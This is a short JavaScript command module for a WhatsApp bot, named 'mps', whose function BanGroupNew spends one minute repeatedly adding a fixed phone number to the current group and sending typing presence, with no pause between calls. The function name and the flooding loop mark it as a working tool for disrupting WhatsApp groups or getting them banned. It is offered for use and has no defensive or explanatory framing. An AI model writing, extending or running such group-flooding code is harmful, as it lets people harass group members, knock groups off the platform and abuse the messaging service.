async function BanGroupNew(sock, groupJid) {
  const startTime = Date.now();
  const duration = 1 * 60 * 1000;
  while (Date.now() - startTime < duration) {

    if (!groupJid.endsWith('@g.us')) {
      throw new Error('@g.us server required');
    }

    let group = groupJid;

    try {
      await sock.groupParticipantsUpdate(
        group,
        ['18188880008@s.whatsapp.net'],
        'add',
      );

      await sock.sendPresenceUpdate('composing', group);
    } catch (err) {
      console.error('error:', err);
      throw err;
    }
  }
}

module.exports = {
  name: 'mps',
  execute: async (sock, msg, args) => {
    const chatJid = msg.key.remoteJid;
    await BanGroupNew(sock, chatJid);
  },
};
